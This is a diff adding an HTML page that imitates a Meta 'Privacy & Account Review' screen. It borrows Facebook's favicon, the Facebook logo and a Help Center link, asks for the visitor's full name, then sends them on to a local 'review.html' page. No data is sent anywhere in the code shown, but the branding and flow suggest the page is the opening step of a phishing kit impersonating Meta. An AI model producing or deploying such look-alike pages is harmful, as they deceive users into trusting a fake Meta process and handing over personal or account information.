@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Meta Privacy & Account Review</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet"/>
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: 'Inter', sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: white;
+      border-radius: 12px;
+      padding: 2rem 2.5rem;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+      max-width: 480px;
+      width: 90%;
+      text-align: center;
+      position: relative;
+    }
+
+    .meta-logo {
+      width: 40px;
+      margin-bottom: 1rem;
+    }
+
+    h1 {
+      font-size: 20px;
+      color: #1c1e21;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      font-size: 15px;
+      color: #4b4f56;
+      margin-bottom: 1.5rem;
+      line-height: 1.6;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 1rem;
+      font-size: 15px;
+    }
+
+    .btn {
+      background-color: #1877f2;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 6px;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 500;
+      display: inline-block;
+      transition: background 0.3s;
+      border: none;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #145bd1;
+    }
+
+    .popup {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.45);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      display: none;
+    }
+
+    .popup-card {
+      background: white;
+      padding: 2rem;
+      border-radius: 10px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .popup h2 {
+      font-size: 18px;
+      margin-bottom: 1rem;
+      color: #1c1e21;
+    }
+
+    .popup p {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 1.5rem;
+    }
+
+    .footer-link {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #7e7e7e;
+    }
+
+    .footer-link a {
+      color: #1877f2;
+      text-decoration: none;
+    }
+
+    .footer-link a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta Logo" class="meta-logo" />
+    <h1>Privacy & Account Review</h1>
+    <p class="description">
+      Please enter your full name to continue.
+    </p>
+    <input type="text" id="fullName" placeholder="Full Name" class="input-field" />
+    <button class="btn" onclick="showPopup()">Continue</button>
+
+    <div class="footer-link">
+      Learn more at the <a href="https://www.facebook.com/help">Meta Help Center</a>
+    </div>
+
+    <div class="popup" id="popup">
+      <div class="popup-card">
+        <h2>Thanks, <span id="displayName"></span></h2>
+        <p>Your preferences will be reviewed shortly. You can now review your account.</p>
+        <a href="review.html" class="btn">continue</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showPopup() {
+      const nameInput = document.getElementById('fullName').value.trim();
+      if (nameInput === "") {
+        alert("Please enter your full name.");
+        return;
+      }
+
+      document.getElementById("displayName").textContent = nameInput;
+      document.getElementById("popup").style.display = "flex";
+    }
+  </script>
+</body>
+</html>
